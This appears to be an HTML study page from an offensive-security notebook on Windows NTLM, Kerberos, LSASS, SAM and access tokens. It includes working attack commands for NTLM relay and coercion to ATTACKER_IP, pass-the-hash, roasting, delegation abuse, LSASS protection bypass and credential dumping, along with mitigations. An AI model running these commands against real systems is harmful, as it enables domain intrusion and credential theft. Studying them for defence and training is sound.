@@ -1,0 +1,2008 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Authentication</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Windows Authentication &amp; Authorization</h1>
+
+    <div class="tab-container">
+      <ul class="nav nav-tabs" role="tablist">
+        <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#notes" role="tab">Notes</a></li>
+        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#labs" role="tab">Labs</a></li>
+        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#ctf" role="tab">CTF Challenges</a></li>
+      </ul>
+
+      <div class="tab-content">
+        <!-- ==================== NOTES TAB ==================== -->
+        <div class="tab-pane fade show active" id="notes" role="tabpanel">
+
+          <!-- NTLM AUTHENTICATION -->
+          <h2>NTLM Authentication</h2>
+
+          <h3>LM Hash vs NT Hash</h3>
+          <p>Windows stores password hashes in two formats:</p>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Property</th><th>LM Hash</th><th>NT Hash (NTLM Hash)</th></tr></thead>
+            <tbody>
+              <tr><td>Algorithm</td><td>DES-based (split password into 2x 7-char blocks, each DES-encrypted against fixed string "KGS!@#$%")</td><td>MD4(UTF-16LE(password))</td></tr>
+              <tr><td>Max password length</td><td>14 characters</td><td>Unlimited (127 in practice)</td></tr>
+              <tr><td>Case sensitivity</td><td>Uppercased before hashing — trivially weak</td><td>Case-sensitive</td></tr>
+              <tr><td>Default state</td><td>Disabled since Vista/Server 2008 (stored as <code>aad3b435b51404eeaad3b435b51404ee</code>)</td><td>Always stored</td></tr>
+              <tr><td>Storage location</td><td>SAM (local) or NTDS.dit (AD)</td><td>SAM (local) or NTDS.dit (AD)</td></tr>
+            </tbody>
+          </table>
+          <p><strong>Critical:</strong> The NT hash is <em>password-equivalent</em>. Possessing it allows authentication without knowing the plaintext (Pass-the-Hash).</p>
+
+          <h3>NTLMv1 vs NTLMv2</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Property</th><th>NTLMv1</th><th>NTLMv2</th></tr></thead>
+            <tbody>
+              <tr><td>Challenge</td><td>8-byte server challenge</td><td>8-byte server challenge + variable-length client challenge (blob)</td></tr>
+              <tr><td>Response algorithm</td><td>DES(NT hash padded to 21 bytes → 3 DES keys encrypt server challenge)</td><td>HMAC-MD5(NTv2 hash, server_challenge + blob)</td></tr>
+              <tr><td>Key derivation</td><td>NT hash split into three 7-byte DES keys</td><td>NTv2 hash = HMAC-MD5(NT hash, uppercase(username) + domain)</td></tr>
+              <tr><td>Security</td><td>Crackable with rainbow tables, vulnerable to relay, can be cracked to NT hash directly</td><td>Client challenge prevents precomputation; still relayable but not crackable to NT hash</td></tr>
+              <tr><td>Negotiation</td><td>LMCompatibilityLevel 0-1</td><td>LMCompatibilityLevel 3-5 (default on modern Windows)</td></tr>
+            </tbody>
+          </table>
+          <p><strong>Why NTLMv1 is weaker:</strong> The response can be cracked offline back to the NT hash using services like crack.sh (leveraging FPGA rainbow tables for DES). NTLMv2 responses can only be cracked to the plaintext password — and only if weak enough for dictionary/brute-force.</p>
+
+          <h3>NTLM Challenge/Response Flow (Type 1/2/3 Messages)</h3>
+          <pre><code class="language-bash"># NTLM Authentication Packet Flow:
+#
+# Client                          Server
+#   |                               |
+#   |--- NEGOTIATE (Type 1) ------->|   Flags: NTLMSSP_NEGOTIATE_56, NTLMSSP_NEGOTIATE_UNICODE,
+#   |                               |          NTLMSSP_NEGOTIATE_NTLM, NTLMSSP_REQUEST_TARGET
+#   |                               |
+#   |<-- CHALLENGE (Type 2) --------|   Contains: Server Challenge (8 bytes), Target Name,
+#   |                               |            Target Info (NetBIOS name, DNS name, timestamp),
+#   |                               |            Negotiated Flags
+#   |                               |
+#   |--- AUTHENTICATE (Type 3) ---->|   Contains: LM Response, NT Response (NTLMv2: NTProofStr + blob),
+#   |                               |            Domain, Username, Workstation, Session Key, MIC
+#   |                               |
+</code></pre>
+
+          <h4>Type 1 (NEGOTIATE_MESSAGE)</h4>
+          <ul>
+            <li>Signature: <code>NTLMSSP\0</code> (8 bytes)</li>
+            <li>Message Type: 0x00000001</li>
+            <li>Negotiate Flags (4 bytes): declares client capabilities</li>
+            <li>Optional: Domain name, Workstation name</li>
+          </ul>
+
+          <h4>Type 2 (CHALLENGE_MESSAGE)</h4>
+          <ul>
+            <li>Server Challenge: 8 random bytes — the nonce</li>
+            <li>Target Name: NetBIOS domain name of the server</li>
+            <li>Target Info: AV_PAIR structures containing:
+              <ul>
+                <li>MsvAvNbDomainName (NetBIOS domain)</li>
+                <li>MsvAvNbComputerName (NetBIOS hostname)</li>
+                <li>MsvAvDnsDomainName (FQDN of domain)</li>
+                <li>MsvAvDnsComputerName (FQDN of server)</li>
+                <li>MsvAvTimestamp (FILETIME — used in NTLMv2 response)</li>
+                <li>MsvAvFlags (0x00000002 = MIC present)</li>
+              </ul>
+            </li>
+          </ul>
+
+          <h4>Type 3 (AUTHENTICATE_MESSAGE)</h4>
+          <ul>
+            <li>LM Response (24 bytes for NTLMv1, variable for NTLMv2)</li>
+            <li>NT Response: NTProofStr (16 bytes HMAC-MD5) + Client Challenge Blob (temp structure with timestamp, client nonce, target info)</li>
+            <li>Domain, Username, Workstation strings</li>
+            <li>Encrypted Random Session Key (for signing/sealing)</li>
+            <li>MIC (Message Integrity Code): HMAC-MD5 over all three messages — prevents tampering</li>
+          </ul>
+
+          <h3>Net-NTLMv2 Hash Format and Cracking</h3>
+          <p>The "Net-NTLMv2 hash" (captured via Responder/MITM) has this format:</p>
+          <pre><code class="language-bash"># Format:
+# username::domain:ServerChallenge:NTProofStr:ClientChallengeBlob
+#
+# Example:
+# admin::CORP:1122334455667788:A4F49C406510BDCA...:0101000000000000...
+
+# Cracking with hashcat (mode 5600 = NetNTLMv2):
+hashcat -m 5600 captured_hash.txt wordlist.txt -r rules/best64.rule
+
+# Cracking with john:
+john --format=netntlmv2 captured_hash.txt --wordlist=wordlist.txt</code></pre>
+
+          <h3>NTLM Relay Attacks</h3>
+          <p><strong>Concept:</strong> Attacker sits between client and server. Client authenticates to attacker, attacker forwards the authentication messages to the real target. The attacker never sees the password or hash — just relays the challenge/response.</p>
+
+          <h4>When NTLM Relay Works:</h4>
+          <ul>
+            <li>SMB signing is <strong>not required</strong> on the target (default: required only on DCs)</li>
+            <li>Target service accepts NTLM authentication</li>
+            <li>The relayed user has permissions on the target</li>
+            <li>Cross-protocol relay: HTTP→SMB, HTTP→LDAP, SMB→HTTP, etc.</li>
+          </ul>
+
+          <h4>Mitigations:</h4>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Mitigation</th><th>What it does</th></tr></thead>
+            <tbody>
+              <tr><td>SMB Signing (Required)</td><td>All SMB packets must be signed with session key. Attacker can't derive session key → can't sign → relay fails.</td></tr>
+              <tr><td>EPA (Extended Protection for Authentication)</td><td>Channel binding: ties NTLM auth to TLS channel. Relay to different TLS session fails.</td></tr>
+              <tr><td>MIC (Message Integrity Code)</td><td>HMAC over all 3 NTLM messages. Attacker can't modify flags (e.g., to remove MIC requirement). Bypass: drop MIC flag from Type 1 — patched in CVE-2019-1040.</td></tr>
+              <tr><td>LDAP signing/channel binding</td><td>Prevents relay to LDAP/LDAPS.</td></tr>
+              <tr><td>Disable NTLM entirely</td><td>Force Kerberos-only. Breaks legacy apps but eliminates relay surface.</td></tr>
+            </tbody>
+          </table>
+
+          <pre><code class="language-bash"># NTLM Relay with impacket:
+ntlmrelayx.py -t smb://192.168.1.100 -smb2support -i  # interactive SMB shell
+ntlmrelayx.py -t ldap://DC01 --escalate-user attacker  # LDAP relay for ACL abuse
+ntlmrelayx.py -t smb://192.168.1.100 -e payload.exe    # execute payload
+ntlmrelayx.py -tf targets.txt -smb2support             # multi-target
+
+# Trigger NTLM auth from victim (coerce):
+# PetitPotam (MS-EFSRPC):
+python3 PetitPotam.py ATTACKER_IP DC_IP
+# PrinterBug (MS-RPRN):
+python3 printerbug.py domain/user:pass@DC_IP ATTACKER_IP
+# DFSCoerce:
+python3 dfscoerce.py -u user -p pass -d domain ATTACKER_IP DC_IP</code></pre>
+
+          <h3>Pass-the-Hash (PtH)</h3>
+          <p>NTLM authentication only requires the NT hash — the password is hashed client-side before any network interaction. Therefore, possessing the hash = possessing the password for network auth.</p>
+          <pre><code class="language-bash"># Pass-the-Hash with various tools:
+
+# CrackMapExec / NetExec:
+crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Impacket psexec:
+psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
+
+# Impacket wmiexec:
+wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
+
+# mimikatz:
+sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
+
+# evil-winrm:
+evil-winrm -i 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>
+
+          <h3>NTLM Downgrade Attacks</h3>
+          <p>If the server accepts NTLMv1 (LMCompatibilityLevel &lt; 3), an attacker performing relay/MITM can:</p>
+          <ul>
+            <li>Modify the CHALLENGE message flags to request NTLMv1 response</li>
+            <li>Set a known challenge (e.g., <code>1122334455667788</code>) for rainbow table cracking</li>
+            <li>Crack the NTLMv1 response back to the NT hash using DES key space search</li>
+            <li>Tool: <code>InternalMonologue</code> — forces local NTLM auth downgrade without touching LSASS</li>
+          </ul>
+          <pre><code class="language-powershell"># Check LMCompatibilityLevel:
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel
+# 0 = Send LM &amp; NTLM responses
+# 1 = Send LM &amp; NTLM - use NTLMv2 if negotiated
+# 2 = Send NTLM response only
+# 3 = Send NTLMv2 response only (default modern Windows)
+# 4 = Send NTLMv2 response only, refuse LM (DC)
+# 5 = Send NTLMv2 response only, refuse LM &amp; NTLM (DC)</code></pre>
+
+          <hr>
+
+          <!-- KERBEROS AUTHENTICATION -->
+          <h2>Kerberos Authentication (Deep Dive)</h2>
+
+          <h3>Full Protocol Flow</h3>
+          <pre><code class="language-bash"># Kerberos Authentication Flow:
+#
+# Client                     KDC (DC)                    Service
+#   |                          |                           |
+#   |-- AS-REQ (pre-auth) ---->|                           |
+#   |   (timestamp encrypted   |                           |
+#   |    with user's key)      |                           |
+#   |                          |                           |
+#   |<--- AS-REP -------------|                           |
+#   |   (TGT encrypted with   |                           |
+#   |    krbtgt key + session  |                           |
+#   |    key encrypted with    |                           |
+#   |    user's key)           |                           |
+#   |                          |                           |
+#   |-- TGS-REQ (TGT + SPN) ->|                           |
+#   |   (authenticator         |                           |
+#   |    encrypted with        |                           |
+#   |    TGT session key)      |                           |
+#   |                          |                           |
+#   |<--- TGS-REP ------------|                           |
+#   |   (Service Ticket        |                           |
+#   |    encrypted with        |                           |
+#   |    service's key)        |                           |
+#   |                          |                           |
+#   |-- AP-REQ (Ticket + Authenticator) ----------------->|
+#   |   (authenticator encrypted with service session key) |
+#   |                          |                           |
+#   |<--------------- AP-REP (optional, mutual auth) -----|
+#   |                          |                           |
+</code></pre>
+
+          <h4>AS-REQ (Authentication Service Request)</h4>
+          <ul>
+            <li><strong>Pre-authentication data:</strong> Timestamp encrypted with user's long-term key (derived from password)</li>
+            <li>Requested principal: <code>krbtgt/REALM@REALM</code></li>
+            <li>Encryption types supported (etype list): AES256, AES128, RC4-HMAC</li>
+            <li>Client principal name and realm</li>
+            <li>Nonce (for replay protection)</li>
+          </ul>
+
+          <h4>AS-REP (Authentication Service Reply)</h4>
+          <ul>
+            <li><strong>TGT</strong> (Ticket-Granting Ticket): encrypted with <code>krbtgt</code> account's key — client cannot decrypt or modify</li>
+            <li><strong>Enc-part:</strong> encrypted with user's key, contains:
+              <ul>
+                <li>Session key (for TGS-REQ authenticator)</li>
+                <li>Ticket lifetime, renew-till</li>
+                <li>Nonce (matching request)</li>
+              </ul>
+            </li>
+          </ul>
+
+          <h4>TGS-REQ (Ticket-Granting Service Request)</h4>
+          <ul>
+            <li><strong>TGT</strong> (opaque blob for KDC)</li>
+            <li><strong>Authenticator:</strong> current timestamp encrypted with TGT session key (proves possession)</li>
+            <li><strong>SPN:</strong> Service Principal Name of target service (e.g., <code>MSSQLSvc/sql01.corp.local:1433</code>)</li>
+            <li>Requested encryption type</li>
+          </ul>
+
+          <h4>TGS-REP (Ticket-Granting Service Reply)</h4>
+          <ul>
+            <li><strong>Service Ticket (ST):</strong> encrypted with the target service account's key — client cannot decrypt</li>
+            <li><strong>Enc-part:</strong> encrypted with TGT session key, contains:
+              <ul>
+                <li>Service session key</li>
+                <li>Ticket flags and lifetime</li>
+              </ul>
+            </li>
+          </ul>
+
+          <h4>AP-REQ / AP-REP</h4>
+          <ul>
+            <li><strong>AP-REQ:</strong> Service ticket + Authenticator (timestamp encrypted with service session key)</li>
+            <li>Service decrypts ticket with its own key → gets service session key → decrypts authenticator → validates timestamp</li>
+            <li><strong>AP-REP (optional):</strong> Service returns client's timestamp encrypted with service session key → proves service identity (mutual authentication)</li>
+          </ul>
+
+          <h3>Ticket Structure</h3>
+          <h4>TGT Contents (encrypted with krbtgt key):</h4>
+          <ul>
+            <li>Client principal name and realm</li>
+            <li>Session key (for TGS-REQ)</li>
+            <li>Auth time, start time, end time, renew-till</li>
+            <li>Ticket flags: FORWARDABLE, PROXIABLE, RENEWABLE, PRE-AUTHENT</li>
+            <li><strong>PAC (Privilege Attribute Certificate):</strong>
+              <ul>
+                <li>User SID</li>
+                <li>Group SIDs (all group memberships including nested)</li>
+                <li>Extra SIDs (SID history)</li>
+                <li>User account control flags</li>
+                <li>Logon information (logon count, bad password count, last logon)</li>
+                <li><strong>PAC Server Signature:</strong> signed with service key (verifiable by service)</li>
+                <li><strong>PAC KDC Signature:</strong> signed with krbtgt key (verifiable only by KDC)</li>
+              </ul>
+            </li>
+          </ul>
+
+          <h4>Attack implications of ticket structure:</h4>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Attack</th><th>Exploits</th><th>Requirement</th></tr></thead>
+            <tbody>
+              <tr><td>Golden Ticket</td><td>TGT encrypted with krbtgt key → forge any TGT</td><td>krbtgt hash</td></tr>
+              <tr><td>Silver Ticket</td><td>Service ticket encrypted with service key → forge ticket to specific service</td><td>Service account hash</td></tr>
+              <tr><td>Diamond Ticket</td><td>Request legitimate TGT, then modify PAC before use</td><td>krbtgt hash</td></tr>
+              <tr><td>Sapphire Ticket</td><td>Use S4U2Self+U2U to get legitimate PAC, embed in forged ticket</td><td>krbtgt hash + target user exists</td></tr>
+            </tbody>
+          </table>
+
+          <h3>Encryption Types</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>EType</th><th>ID</th><th>Key Derivation</th><th>Security</th></tr></thead>
+            <tbody>
+              <tr><td>RC4-HMAC</td><td>23</td><td>Key = NT hash directly</td><td>Weak — enables Pass-the-Hash and easy Kerberoasting</td></tr>
+              <tr><td>AES128-CTS-HMAC-SHA1</td><td>17</td><td>PBKDF2(password, salt=REALM+principal, iterations=4096)</td><td>Strong</td></tr>
+              <tr><td>AES256-CTS-HMAC-SHA1</td><td>18</td><td>PBKDF2(password, salt=REALM+principal, iterations=4096)</td><td>Strongest — default on modern AD</td></tr>
+            </tbody>
+          </table>
+          <p><strong>Kerberoasting note:</strong> If RC4 is negotiable (etype 23), attackers request tickets encrypted with RC4 since the key IS the NT hash — faster to crack than AES. Defense: disable RC4 in <code>msDS-SupportedEncryptionTypes</code>.</p>
+
+          <h3>Pre-Authentication</h3>
+          <p>Pre-auth prevents offline password guessing against AS-REP. The KDC requires the client to prove knowledge of the password <em>before</em> issuing a TGT.</p>
+          <ul>
+            <li><strong>PA-ENC-TIMESTAMP:</strong> Current timestamp encrypted with user's long-term key</li>
+            <li>KDC decrypts → if timestamp within skew tolerance → user proved knowledge</li>
+            <li><strong>DONT_REQUIRE_PREAUTH (UAC flag 0x400000):</strong> If set, KDC issues AS-REP without pre-auth</li>
+            <li><strong>AS-REP Roasting:</strong> Request AS-REP for user with pre-auth disabled → get TGT encrypted with user's key → offline crack</li>
+          </ul>
+          <pre><code class="language-bash"># AS-REP Roasting:
+# Find users with DONT_REQUIRE_PREAUTH:
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
+
+# With Rubeus (from domain-joined machine):
+Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
+
+# Crack with hashcat (mode 18200):
+hashcat -m 18200 asrep_hashes.txt wordlist.txt</code></pre>
+
+          <h3>Service Principal Names (SPNs)</h3>
+          <p>SPNs map a service to an account. Kerberos uses SPNs to determine which account's key encrypts the service ticket.</p>
+          <pre><code class="language-bash"># SPN Format:
+# serviceclass/host:port/servicename
+# Examples:
+#   MSSQLSvc/sql01.corp.local:1433
+#   HTTP/web01.corp.local
+#   cifs/fileserver.corp.local
+#   HOST/dc01.corp.local
+
+# Query SPNs (PowerShell):
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name,ServicePrincipalName
+
+# setspn.exe:
+setspn -L username        # List SPNs for account
+setspn -Q */sql01*        # Search for SPNs
+setspn -S MSSQLSvc/sql01.corp.local:1433 svc_sql  # Register SPN</code></pre>
+
+          <h4>Kerberoasting:</h4>
+          <pre><code class="language-bash"># Any domain user can request a TGS for any SPN
+# Service ticket is encrypted with service account's key → offline crackable
+
+# Impacket:
+GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.1 -request -outputfile kerb_hashes.txt
+
+# Rubeus:
+Rubeus.exe kerberoast /outfile:kerb_hashes.txt
+
+# Crack (hashcat mode 13100 for RC4, 19700 for AES):
+hashcat -m 13100 kerb_hashes.txt wordlist.txt</code></pre>
+
+          <h3>Delegation Types</h3>
+
+          <h4>Unconstrained Delegation</h4>
+          <ul>
+            <li>Server stores the user's TGT in memory when user authenticates</li>
+            <li>Server can impersonate the user to <strong>any</strong> service</li>
+            <li>Flag: <code>TRUSTED_FOR_DELEGATION</code> (UAC 0x80000)</li>
+            <li><strong>Attack:</strong> Coerce a DC to authenticate → capture DC's TGT → DCSync</li>
+          </ul>
+          <pre><code class="language-powershell"># Find unconstrained delegation machines:
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Extract cached TGTs with Rubeus:
+Rubeus.exe triage
+Rubeus.exe dump /luid:0x3e7 /service:krbtgt</code></pre>
+
+          <h4>Constrained Delegation (S4U)</h4>
+          <ul>
+            <li>Server can only delegate to <strong>specific services</strong> listed in <code>msDS-AllowedToDelegateTo</code></li>
+            <li><strong>S4U2Self:</strong> Service requests a ticket to itself on behalf of any user (even without their TGT). Returns a forwardable ticket if TRUSTED_TO_AUTH_FOR_DELEGATION is set.</li>
+            <li><strong>S4U2Proxy:</strong> Uses the S4U2Self ticket to request a service ticket to the allowed target on behalf of the user.</li>
+            <li><strong>Attack:</strong> Compromise a service with constrained delegation → S4U2Self for any user → S4U2Proxy to allowed service → code execution on target</li>
+          </ul>
+          <pre><code class="language-bash"># Constrained delegation attack with Rubeus:
+# 1. Get TGT for compromised service account:
+Rubeus.exe asktgt /user:svc_web /rc4:HASH /domain:corp.local
+
+# 2. S4U (self + proxy) to allowed service as admin:
+Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
+
+# With Impacket:
+getST.py -spn cifs/fileserver.corp.local -impersonate administrator corp.local/svc_web -hashes :HASH
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass fileserver.corp.local</code></pre>
+
+          <h4>Resource-Based Constrained Delegation (RBCD)</h4>
+          <ul>
+            <li>Delegation permission configured on the <strong>target</strong> (not the source)</li>
+            <li>Attribute: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on target computer</li>
+            <li><strong>Attack path:</strong> If you can write to this attribute on a target (GenericWrite/GenericAll) → configure your controlled account for RBCD → S4U to target as any user</li>
+            <li>No <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> flag needed</li>
+          </ul>
+          <pre><code class="language-powershell"># RBCD Attack:
+# 1. Create or use existing machine account (any domain user can create up to 10 by default):
+New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+
+# 2. Set RBCD attribute on target:
+Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKEMACHINE$
+
+# 3. Get hash of fake machine account:
+Rubeus.exe hash /password:FakePass123! /user:FAKEMACHINE$ /domain:corp.local
+
+# 4. S4U attack:
+Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt</code></pre>
+
+          <h3>krbtgt Account</h3>
+          <ul>
+            <li>Built-in account in every AD domain — disabled, cannot log on interactively</li>
+            <li>Its password hash encrypts every TGT in the domain</li>
+            <li>Compromising krbtgt = ability to forge any TGT (Golden Ticket) = complete domain compromise</li>
+            <li>Password never changes automatically — must be manually rotated</li>
+            <li>Best practice: rotate krbtgt password twice (first reset invalidates current tickets after TGT lifetime; second reset invalidates tickets encrypted with the N-1 password)</li>
+          </ul>
+
+          <h3>Clock Skew</h3>
+          <ul>
+            <li>Default tolerance: <strong>5 minutes</strong> (MaxClockSkew in Default Domain Policy)</li>
+            <li>If client/server clocks differ by more → <code>KRB_AP_ERR_SKEW</code></li>
+            <li>Attackers must sync their clock: <code>ntpdate DC_IP</code> or <code>faketime</code></li>
+            <li>Authenticators include timestamp → prevents replay (each timestamp valid only once within skew window)</li>
+          </ul>
+
+          <hr>
+
+          <!-- LSA -->
+          <h2>LSA (Local Security Authority)</h2>
+
+          <h3>LSASS Process</h3>
+          <p><code>lsass.exe</code> (Local Security Authority Subsystem Service) handles:</p>
+          <ul>
+            <li>User authentication (validate credentials against SAM or AD)</li>
+            <li>Security token creation</li>
+            <li>Security policy enforcement</li>
+            <li>Security audit log generation</li>
+          </ul>
+
+          <h3>What's Stored in LSASS Memory</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Credential Type</th><th>Stored When</th><th>Notes</th></tr></thead>
+            <tbody>
+              <tr><td>NT Hash</td><td>Interactive logon (Type 2, 10)</td><td>Always stored for SSO</td></tr>
+              <tr><td>Kerberos TGT + Session Keys</td><td>Domain authentication</td><td>Enables transparent service ticket requests</td></tr>
+              <tr><td>Kerberos Service Tickets</td><td>After accessing services</td><td>Cached for reuse</td></tr>
+              <tr><td>WDigest plaintext password</td><td>If UseLogonCredential=1 (default pre-2012R2)</td><td>Plaintext! Disabled by default on Server 2012 R2+ / Win 8.1+</td></tr>
+              <tr><td>DPAPI master keys</td><td>User logon</td><td>Protects user's encrypted data</td></tr>
+              <tr><td>MSV1_0 credentials</td><td>Interactive logon</td><td>Primary credential package</td></tr>
+              <tr><td>CredSSP/TsPkg</td><td>RDP with NLA</td><td>Cleartext for SSO to remote sessions</td></tr>
+            </tbody>
+          </table>
+
+          <h3>LSA Secrets</h3>
+          <p>Stored in registry: <code>HKLM\SECURITY\Policy\Secrets</code> (encrypted with SYSKEY/boot key).</p>
+          <ul>
+            <li><strong>$MACHINE.ACC:</strong> Machine account password (computer joins domain with this)</li>
+            <li><strong>DefaultPassword:</strong> Auto-logon password (if configured)</li>
+            <li><strong>NL$KM:</strong> Key for cached domain logon credentials (DCC2)</li>
+            <li><strong>_SC_&lt;ServiceName&gt;:</strong> Service account passwords (services running as domain accounts)</li>
+            <li><strong>DPAPI_SYSTEM:</strong> DPAPI system master key backup</li>
+          </ul>
+          <pre><code class="language-bash"># Extract LSA secrets:
+# mimikatz:
+lsadump::secrets
+
+# Impacket (remote, needs admin):
+secretsdump.py corp.local/admin:pass@192.168.1.100
+
+# Registry extraction (offline):
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SECURITY security.save
+secretsdump.py -system system.save -security security.save LOCAL</code></pre>
+
+          <h3>Credential Guard &amp; RunAsPPL</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Protection</th><th>Mechanism</th><th>What it protects</th></tr></thead>
+            <tbody>
+              <tr><td>Credential Guard</td><td>Isolates LSASS secrets in a VBS (Virtualization-Based Security) enclave — separate virtual trust level</td><td>NT hashes, Kerberos TGTs/keys. Even kernel-level compromise can't read them.</td></tr>
+              <tr><td>RunAsPPL</td><td>Runs LSASS as Protected Process Light — only Microsoft-signed code can interact</td><td>Prevents unsigned drivers/processes from reading LSASS memory. Bypassable with signed vulnerable driver (e.g., RTCore64.sys, DBUtil_2_3.sys).</td></tr>
+            </tbody>
+          </table>
+          <pre><code class="language-powershell"># Check if Credential Guard is running:
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select VirtualizationBasedSecurityStatus
+
+# Check if LSASS runs as PPL:
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
+
+# Bypass PPL with vulnerable driver (mimikatz):
+!+ # loads mimidrv.sys
+!processprotect /process:lsass.exe /remove
+sekurlsa::logonpasswords</code></pre>
+
+          <h3>SAM Database</h3>
+          <ul>
+            <li>Location: <code>C:\Windows\System32\config\SAM</code></li>
+            <li>Stores local account NT hashes (and disabled LM hashes)</li>
+            <li>Encrypted with SYSKEY (boot key from SYSTEM hive)</li>
+            <li>Accessible offline or via <code>reg save</code> (requires SYSTEM privileges)</li>
+          </ul>
+          <pre><code class="language-bash"># Dump SAM:
+# mimikatz:
+lsadump::sam
+
+# Impacket (local, from saved hives):
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+secretsdump.py -sam sam.save -system system.save LOCAL
+
+# Volume Shadow Copy (bypass file lock):
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system</code></pre>
+
+          <hr>
+
+          <!-- ACCESS TOKENS -->
+          <h2>Access Tokens</h2>
+
+          <h3>Primary vs Impersonation Tokens</h3>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Type</th><th>Description</th><th>Created When</th></tr></thead>
+            <tbody>
+              <tr><td>Primary Token</td><td>Assigned to a process at creation. Represents the user who started the process.</td><td>Process creation (CreateProcess)</td></tr>
+              <tr><td>Impersonation Token</td><td>Thread-level token. Allows a thread to act as a different security context.</td><td>Service handling client request (e.g., named pipe connection, COM call)</td></tr>
+            </tbody>
+          </table>
+
+          <h4>Impersonation Levels:</h4>
+          <table class="table table-dark table-bordered">
+            <thead><tr><th>Level</th><th>Value</th><th>Capability</th></tr></thead>
+            <tbody>
+              <tr><td>SecurityAnonymous</td><td>0</td><td>Cannot obtain any info about the client</td></tr>
+              <tr><td>SecurityIdentification</td><td>1</td><td>Can query client's identity/privileges but cannot impersonate</td></tr>
+              <tr><td>SecurityImpersonation</td><td>2</td><td>Can impersonate client on <strong>local</strong> system only</td></tr>
+              <tr><td>SecurityDelegation</td><td>3</td><td>Can impersonate client on <strong>remote</strong> systems (Kerberos delegation)</td></tr>
+            </tbody>
+          </table>
+
+          <h3>Token Structure</h3>
+          <ul>
+            <li><strong>User SID:</strong> Identity of the token owner</li>
+            <li><strong>Group SIDs:</strong> All groups the user belongs to (including nested, with SE_GROUP_ENABLED flag)</li>
+            <li><strong>Privileges:</strong> SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryTokenPrivilege, etc.</li>
+            <li><strong>Integrity Level:</strong> Mandatory label (Low/Medium/High/System)</li>
+            <li><strong>Session ID:</strong> Logon session this token belongs to</li>
+            <li><strong>Token Type:</strong> Primary or Impersonation</li>
+            <li><strong>Logon SID:</strong> Unique per logon session</li>
+            <li><strong>Default DACL:</strong> DACL applied to objects created by this token</li>
